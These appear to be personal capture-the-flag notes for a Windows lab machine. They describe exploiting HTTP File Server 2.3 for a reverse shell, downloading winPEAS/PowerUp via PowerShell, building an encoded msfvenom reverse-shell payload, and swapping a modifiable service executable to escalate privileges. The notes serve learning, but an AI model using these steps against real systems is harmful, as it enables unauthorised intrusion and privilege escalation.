nmap scan shows http file server 2.3 running on port 8080, this is vulnerable to remote code execution exploit.
search msfdb or exploitdb for the exploit and use it to a reverse shell.

user flag is in C:\Users\bill\Desktop

get winPEAS or PowerUp on to target machine:
run a http file server and use powershell wget "http://IP:port/file.extension" -outfile "location/file.extension"
run the script to find vulnerability on AdvancedSystemCareService9 where the execution is modifiable

msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -e x86/shikata_ga_nai -f exe -o ASCService.exe
things I learned abt msfvenom
-e is encoding
-f is file extension
-o is output

open a netcat listener on the port specified on the payload (or use metasploit multi handler)

before uploading the payload check if you can stop and restart AdvancedSystemCareService9 
on target machine
>shell
>sc stop servicename
>sc start servicename

stop the vulnerable service
upload the .exe payload to the target and replace the legitimate .exe file
start the vulnerable service again and the netcat listener should catch a shell
